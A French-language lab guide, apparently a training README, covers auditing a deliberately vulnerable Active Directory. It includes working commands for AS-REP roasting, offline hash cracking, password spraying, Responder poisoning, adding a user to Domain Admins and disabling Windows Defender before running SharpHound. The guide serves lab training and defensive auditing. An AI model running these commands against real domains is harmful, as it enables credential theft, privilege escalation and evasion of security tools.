<h1 align="center">AUDIT DE SÉCURITÉ WINDOWS AD</h1>



<br>

<p align="center">
  <img src="img/bhscreen.png" />
</p>
<!-- ça servait à rien de le faire gros malin -->


<br>

> [!IMPORTANT]
> Lors d'un Audit ou d'un Pentest et quelque soit sa nature, penser à toujours documenter les informations récoltées au fur et à mesure afin d'éviter les oublis (en vue du rapport pour le client), mais également si des modifications sont apportées (créations d'utilisateurs, modification des droits pour éléver ses privilèges...) de pouvoir être capable de rendre les choses dans leur état initial. 

<br>

## Mise en place de BadBlood


BadBlood permet de rendre l'Active Directory vulnérable c'est un script qui génère de nombreux groupes et utilisateurs avec de mauvaises permissions ainsi que des paramètres générant des failles exploitables comme c'est souvent le cas en entreprise.

Il est utilisé pour tester BloodHound et s’entraîner à l’attaque/défense AD en simulant des scénarios réels sans impacter un vrai environnement de production.

Lien vers la [page GitHub du créateur de BadBlood](https://github.com/davidprowe/BadBlood)


<br>


> [!WARNING]
> ⚠️ Ne sourtout pas utiliser ce script sur un DC d'entreprise (dommages non réversibles).


<br>

Téléchager et exécuter le script
```Powershell
# clone the repo
git clone https://github.com/davidprowe/badblood.git
#Run Invoke-badblood.ps1
./badblood/invoke-badblood.ps1
```


<br>



## Scan de Ports et services
```sh
sudo nmap -sV 10.0.0.1
```

![img](img/nmap.png)


<br>




## __PING CASTLE__

* Ping Castle permet de faire un état de santé général de l'Active Directory.
* Cet outils est basé sur les critères de sécurités comme CIS Benchmarks, ANSSI
* Il génère un rapport détallé en 4 blocs distincts.
* Lien vers le [téléchargement de PingCastle](https://www.pingcastle.com/download/)

<br>


Un score est indiqué pour chacune des 4 parties, trust est à 0 car il n'y a pas de DC de réplication.

![img](img/ind_pingcastle.png)

<br>


| Catégorie            | Description                                                     |
|----------------------|-----------------------------------------------------------------|
| *Stale Objects*        | Operations related to inactive or obsolete user or computer objects |
| *Trusts*               | Connections between two Active Directory domains or forests     |
| *Privileged Accounts*  | Administrators and highly privileged accounts in Active Directory |
| *Anomalies*            | Specific security control points and abnormal behaviors         |


<br>


Dans la partie **Stale Objects** on retrouve une liste de comptes qui ne requièrent pas de pré-authentification Kerberos

![img](img/pc1.png)

<br>

On peut aussi voir un compte administrateur qui ne nécéssite pas de pré-authentification Kerberos

![img](img/ping1.png)

<br>

Vérifer les comptes (Ordinateurs et Utilisateurs) qui ne nécéssitent pas de pré-authetification Kerberos
```powershell
Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
```

<br>


## __Fonctionnement du protocole Kerberos__

![](img/krbproto.png)



<br>

<br>

# Steal or Forge Kerberos Tickets: Golden Ticket

> ATT&CK Tactic : Credential Access <br>
> ATT&CK Technique ID: T1558.001

La vulnérabilité **AS-REP Roasting** consite à récupérer un ticket TGT ou Golden Ticket

* Les **Ticket Granting Tickets** sont fournis par le **Key Distribution Center** (KDC), mais obtenus de façon malicieuse on les appelle **Golden Tiket**.
* Certains programmes et applications supportent l'authentification LDAP que si la préauthentification est désactivée sur le compte de service.
* Si la pré-authentification est désactivée sur un compte, n'importe qui peut réclamer un ticket au nom de l'utilisateur.
* Impacket permet de récupérer le message **AS-REP** (Authentication Service Response) d'un utilisateur avec le hash kerberos (etype 23 – RC4-HMAC).

<br>

> [!NOTE] 
> Le mot de passe de ce compte Administrateur (récupéré avec PingCastle) a été changé manuellement dans l'AD car le script BadBlood génère des comptes expirés, mais dans un cas réel ces comptes sont actifs (souvent des comptes dédiés à des services).

<br>

### Impacket 

Fichier contenant les noms d'utilisateurs trouvés depuis PingCastle avec la préauth Kerberos désactivée
```sh
impacket-GetNPUsers tssr-cyber.fr/ -no-pass -usersfile usr.txt
```


<br>

Cibler un seul compte
```sh
impacket-GetNPUsers TSSR-CYBER.FR/KATRINA_RUTLEDGE -no-pass
```
![img](img/krb5_ticket.png)


Ajouter le hash dans un fichier
```sh
printf '%s\n' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.txt 
```

<br>

| Code d’erreur Kerberos            | Statut de l’utilisateur                                   |
|---------------------------------:|------------------------------------------------------------|
| *KDC_ERR_C_PRINCIPAL_UNKNOWN*      | Le nom d’utilisateur n’existe pas                          |
| *KDC_ERR_PREAUTH_REQUIRED*         | Le nom d’utilisateur est valide et le compte est activé    |
| *KDC_ERR_CLIENT_REVOKED*           | L’utilisateur existe, mais le compte est désactivé ou bloqué |
| *KDC_ERR_KEY_EXPIRED*             | Password expiré, changé le pswd pur reset   |




<br>



## __OFFLINE CRAKING__


Après avoir avoir récupéré un hash, créer un fichier (ici asrep.hash) qui contient le hash AS-REP obtenu avec impacket : `$krb5asrep$23$KATRINA_RUTLEDGE@CYBER-MANAGEMENT.FR:<hash>`.

Il est possible de le craker avec hashcat ou JhonTheRipper.
```sh
sudo hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
```

![img](img/crackedhash.png)

<br>

Rajouter un fichier de règle si besoin
```sh
sudo hashcat -m 18200 -a 0 berniepatehash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

![img](img/crackrule.png)




<br>




## __DUMPER LES OBJETS LDAP__

Les informations collectées sont similaires à Ping Castle, mais l'outils est rapide et peut toujours être utile lors d'un Audit AD.

* **ldapdomaindump**
  * Dumper les utilisateurs AD
  * Dumper les groupes AD
  * Dumper la Domain policy
  * Dumper les computers AD
  * Dumper les OS Version computers AD

<br>

> [!NOTE]
> Comme SharpHound, ldapdomaindump n'a pas besoins d'être effectué avec un compte admin, un utilisateur standard suffit pour intéroger LDAP.
   
<br>

Dumper les objets LDAP de l'AD et afficher le rapport utilisateur (`-o`va créer un dossier de destination)
```sh
ldapdomaindump -u 'TSSR-CYBER.FR\KATRINA_RUTLEDGE' -p Hacker1 10.0.0.1 -o LDAP-DUMP
```
```sh
firefox domain_users.html  
```

![](img/dump.png)

<br>

Domain policy rapport

![](img/dumpolicy.png)




<br>




## Comptes qui répondent aux requêtes **Kerberos (AS-REQ)**

* Il peut aussi être utile d'énumérer les comptes qui répondent aux requêtes **Kerberos (AS-REQ)** 
* Ca peut permettre d'écarter :
    * compte désactivé
    * compte verrouillé
    * compte sans mot de passe Kerberos valide
    * compte “logon interdit”
    * compte machine / service
    * compte protégé (Protected Users, smartcard required, etc.)

```sh
./kerbrute_linux_amd64 userenum -d TSSR-CYBER.FR /home/toto/Bureau/domnames.txt -v
```

![img](img/krb_enum.png)




<br>




## __Comptes AD qui ont le même mot de passe__


* Tester un mot de passe avec un utilisateur valide de l'AD (login + mdp)
* Il est possible d'utiliser sprayhound sans compte valide
* Retrouver plus d'infos sur [la page GitHib SprayHound](https://github.com/Hackndo/sprayhound)

<br>


> [!WARNING]
> * SprayHound obtiendra la password policy avec un compte valide.
> * Sans compte valide, pas de découverte de password policy donc attention au blocage de comptes.

```sh
sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p 'Tssrcyber1234' -v
```
* `-lu` 'login ldap user name'
* `-lp` 'paswd ldap user'
* `-p` 'pswd to test'

<br>

![img](img/sprhnd.png)





<br>





## __Intercepter un hash NTLMv1 ou NTLMv2__

__Responder__

> T1557.001 – LLMNR/NBT-NS Poisoning

`Link-Local Multicast Name Resolution` (LLMNR) et `NetBIOS Name Service` (NBT-NS) sont des composants Microsoft Windows qui servent de méthodes alternatives d'identification d'hôte.

* Responder usurpe des services via MDNS / LLMNR / NBT-NS  / WPAD 
* NTLM peut être amené à utiliser ces protocoles, Responder peut donc les intercepter.
* Il vient se placer entre le client et le “serveur” inexistant (qu'il imite)
* Il peut permettre de forcer une authentification NTLM puis récupère le hash de Kerberos

<br>

Indiquer l'interface sur laquelle on souhaite écouter (celle de la machine d'attaque)
```sh
sudo responder -I eth0 -w
```

<br>

Un test simple pour voir si Responder fonctionne est d'effectuer un ping sur une machine ou un serveur inexistant
```bat
ping FAUXSERVEUR
```
La machine Windows aura bien une réponse au ping pour FAUXSERVEUR.

![res](img/responder0.png)

<br>

* Windows suit cet ordre lors du ping : DNS, LLMNR, NBT-NS
* Comme FAUXSERVEUR n’existe pas en DNS, windows diffuse ensuite les requêtes LLMNR / NBT-NS sur le réseau
* Responder répond “c’est moi FAUXSERVEUR”

![img](img/responder1.png)



En se connectant depuis un navigateur de la machine cliente vers la machine attaquante on peut déclencher un UAC et capturer le hash mais en entreprise il est possible de capturer des hashs de cette façon en fonction de la configuration de plusieurs paramètres différents (pare-feu, règles de parefeu, NTLMv1, NTLMv2...)

![img](img/responder2.png)

__Chemin des logs Responder :__
```
/usr/share/responder/logs
```




<br>




## __Se connecter via WinRM sur la machine victime__

### L'utilisateur doit être dans le groupe admin du domaine
```sh
sudo evil-winrm -i 10.0.0.1 -u '<UserName>@<Domain-Name>' -p '<password>'
```

![img](img/evil.png)

### Extraire une liste d'utilisateurs de l'AD
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -Encoding UTF8 C:\Users\Administrateur\Desktop\domusers.txt
```
### Tranférer la liste du DC vers la Kali
```sh
scp C:\Users\Administrateur\Desktop\domusers.txt totol@10.0.0.51:/home/toto/Bureau/
```

### Afficher les groupes contenant la string "admin"
```powershell
Get-ADGroup -Filter 'Name -like "admin*"' | Select name
```

### Ajouter un utilisateur dans le groupe admin du domaine
```powershell
Add-ADGroupMember -Identity "Admins du domaine" -Members "EDDIE_ROACH"
```

### Ajouter du flag DONT_REQ_PREAUTH dans l'attribut userAccountControl (désactive la préauth kerberos)
```powershell
Set-ADUser EDDIE_ROACH -Replace @{userAccountControl = ( (Get-ADUser EDDIE_ROACH -Properties userAccountControl).userAccountControl -bor 0x400000 )}
```

### Changer la password d'un utilisateur 
```powershell
Set-ADAccountPassword EDDIE_ROACH -Reset -NewPassword (ConvertTo-SecureString "Password123456" -AsPlainText -Force)
```

### Récupérer son ticket kerberos
```sh
impacket-GetNPUsers TSSR-CYBER.FR/EDDIE_ROACH -no-pass
```

Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de charger des scripts en mémoire pour éviter la détection.






<br>





# __BLOODHOUND__


<br>


![](img/bhlogo.png)

<br>

BloodHound collecte les relations AD (sessions, groupes, ACL, délégations, trusts…) et les modélise sous forme de graphe et permet d’identifier des chemins d’attaque menant à des comptes à privilèges.

C'est est principalement un outils RedTeam, mais il peut aussi servir à comprendre comment un attaquant peut escalader ses privilèges dans un domaine AD et à prioriser les failles de configuration à corriger. (BlueTeam)


<br>


## Éxécuter SharpHound.exe

SharpHound se lance sur une machine du domaine, c'est lui qui se charge de récolter les informations du domaine qu'on exploitera par la suite.

### Désactiver Defender, ajouter une exclusion pour "C:\Windows\Temp", exclut les extension .exe et .ps1
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```


### Télécharger SharpHound
```powershell
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.8.0/SharpHound_v2.8.0+debug_windows_x86.zip -OutFile "C:\Windows\Temp\SharpHound.zip"
```


### Dézipper et exécuter SharpHound
```powershell
sl "C:\Windows\Temp"
Expand-Archive -Path SharpHound.zip -DestinationPath .\SharpHound
cd .\SharpHound\
.\SharpHound.exe -d $env:USERDNSDOMAIN
```

Après exécution du script un fichier "20260108151307_BloodHound.zip" apparîtera il faut l'importer dans la machine où se trouve le serveur web installé avec doker-compose.


<br>

---


### Transférer le fichier vers la machine d'attaque 
```sh
scp -P 1111 administrateur@10.0.0.1:/C:/Users/Administrateur/Desktop/20260108151307_BloodHound.zip .
```

### Réactiver Defender après avoir transféré le fichier
```shell
Set-MpPreference `
  -DisableRealtimeMonitoring $false `
  -DisableBehaviorMonitoring $false `
  -DisableIntrusionPreventionSystem $false `
  -DisableIOAVProtection $false `
  -DisableScriptScanning $false `
  -DisablePrivacyMode $false `
  -DisableBlockAtFirstSeen $false

Remove-MpPreference -ExclusionExtension "ps1","exe"
Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
```


<br>

---


### Installation de Docker-Compose sur Kali
```sh
sudo apt install -y docker.io
sudo systemctl enable docker --now
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
docker-compose --version
```


<br>

---


### Lancer le conteneur BloodHound

```sh
# Créer le dossier, se positionner dedans
mkdir bloodhound && cd bloodhound

# Téléchargement et création du fichier docker-compose Bloodhound (fichier de IT-Connect)
sudo wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml -O ~/Documents/docker-compose-Bloodhound.yml

# Pour lancer le docker compose en arrière plan
sudo docker-compose -f ~/Documents/docker-compose-BloodHound.yml up -d

# Arrêter le conteneur en arrière plan
sudo docker-compose -f docker-compose-BloodHound.yml down
```


<br>

---


### Se connecter sur la page web de BloodHound 

Identifiants indiqués dans le fichier docker-compose.yml (il faudra changer le mot de passe)
```
BloodHound 
http://localhost:8080
user : admin
password : BloodhoundIsNow123

Neo4j
WEB :http://localhost:7474
DB : localhost:7687
user : neo4j
password : bloodhoundcommunityedition
```

Aller dans Upload et charger le fichier "20260108151307_BloodHound.zip"



